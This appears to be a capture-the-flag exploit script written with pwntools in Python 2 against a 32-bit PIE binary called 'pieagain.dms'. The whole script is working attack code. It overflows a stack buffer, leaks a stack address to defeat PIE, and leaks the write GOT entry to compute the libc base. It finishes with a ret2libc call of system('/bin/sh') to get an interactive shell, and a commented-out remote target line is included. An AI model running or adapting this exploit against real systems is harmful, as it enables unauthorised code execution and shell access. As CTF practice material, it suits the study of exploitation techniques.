from pwn import *

elf=ELF('pieagain.dms')
libc=ELF('libc.so.6')

plt_write=elf.symbols['write']
got_write=elf.got['write']
print "got_write",hex(got_write)
libc_system=libc.symbols['system']
libc_write=libc.symbols['write']

HOST='192.168.210.11'
#r=remote(HOST,10008)
r=process('pieagain.dms')
r.recv()
r.sendline('A')
r.recvline()
r.recvline()
r.sendline('A'*44+chr(0xDE))
sleep(0.5)
sleep(1)
d_stack=r.recv()
print "------------"
#print d_stack
print "-------------"
print "d_stack 25-26: ",d_stack[25*4:26*4]
rt_start_addr=u32(d_stack[25*4:26*4])
print "[+] rt_start_addr:",hex(rt_start_addr)
rt_offs=(rt_start_addr>>12)<<12
print "[+] rt_offs:",hex(rt_offs)

rt_plt_write=plt_write+rt_offs
rt_got_write=got_write+rt_offs
rt_start_addr=0x580+rt_offs

print "[+] start address:",hex(rt_start_addr)
print "[+] write address:",hex(rt_plt_write)
print "[+] write got address:",hex(rt_got_write)

#return to start ....
payload0='A'*44
payload0+=p32(rt_start_addr)
r.sendline(payload0)
r.recvline()
r.sendline('A')
sleep(0.5)
r.recvline()
r.recvline()

#leak write and return to start again...
payload1='A'*44
#payload1+=p32(rt_plt_write)+p32(rt_start_addr)+p32(1)+p32(rt_got_write)+p32(4)
payload1+=p32(rt_offs+0x7b2)+p32(rt_start_addr)+p32(1)+p32(rt_got_write)+p32(4)


r.sendline(payload1)
d_write=r.recv(4)
rt_write_addr=u32(d_write)
print "[+] rt_write_addr: ",hex(rt_write_addr)
rt_libc_base=rt_write_addr-libc_write
rt_system_addr=rt_libc_base+libc_system
rt_bin_sh_addr=rt_libc_base+next(libc.search('/bin/sh'))
print "[+] system addr: ",hex(rt_system_addr)
print "[+] bin_sh addr: ",hex(rt_bin_sh_addr)

r.recvline()
r.sendline('A')
sleep(0.5)
r.recvline()
r.recvline()

#getshell!!!
payload2='A'*44
payload2+=p32(rt_system_addr)+'B'*4+p32(rt_bin_sh_addr)
r.sendline(payload2)
r.interactive()
